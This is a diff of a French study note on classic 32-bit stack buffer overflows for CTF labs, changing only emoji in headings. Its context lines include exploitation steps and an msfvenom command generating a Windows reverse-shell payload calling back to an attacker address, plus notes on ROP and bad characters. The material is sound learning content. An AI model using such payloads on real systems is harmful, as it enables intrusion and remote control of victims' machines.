@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 💥 Buffer Overflow (32-bit classique)
+# Buffer Overflow (32-bit classique)
 
 > [!info] **En 1 phrase**
 > Buffer Overflow = écrire **plus de données que prévu** dans une variable, écraser le pointeur de
@@ -20,7 +20,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -39,13 +39,13 @@ Pile (croissance) :
 +---------------------------+
 ```
 
-> [!info] 💡 **Contexte d'apprentissage**
+> [!info] **Contexte d'apprentissage**
 > L'exploitation moderne exige DEP/ASLR/canaries + **ROP**. La version "classique 32-bit"
 > (stack exécutable, pas d'ASLR) apprend le **mécanisme**. Les CTF (THM, VulnHub) l'utilisent.
 
 ---
 
-## ⚙️ Les étapes
+## Les étapes
 
 1. **Crash** : envoyer un input trop long, repérer la taille.
 2. **Offset** : trouver combien de bytes avant d'écraser EIP (pattern_create / offset).
@@ -56,7 +56,7 @@ Pile (croissance) :
 
 ---
 
-## 🛠️ Exploitation
+## Exploitation
 
 ```bash
 # Pattern pour l'offset
@@ -86,7 +86,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -97,17 +97,17 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **ROP = le réflexe moderne**
+> [!tip] **ROP = le réflexe moderne**
 > Quand DEP est activé, on enchaîne des **gadgets** (petites instructions) pour appeler
 > `VirtualProtect` puis exécuter le shellcode — sans jamais l'exécuter depuis la pile.
 
-> [!warning] ⚠️ **Piège** : le **bad char** `\x00` casse tout (terminaison de chaîne). Toujours la liste complète des bad chars, sinon le shellcode meurt silencieusement.
+> [!warning] **Piège** : le **bad char** `\x00` casse tout (terminaison de chaîne). Toujours la liste complète des bad chars, sinon le shellcode meurt silencieusement.
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[Reverse Shells|🕸️ Reverse Shells]]
-- → Note complète : [[04 - Exploitation Réseau|💥 Exploitation Réseau]]
+- [[Reverse Shells| Reverse Shells]]
+- → Note complète : [[04 - Exploitation Réseau| Exploitation Réseau]]
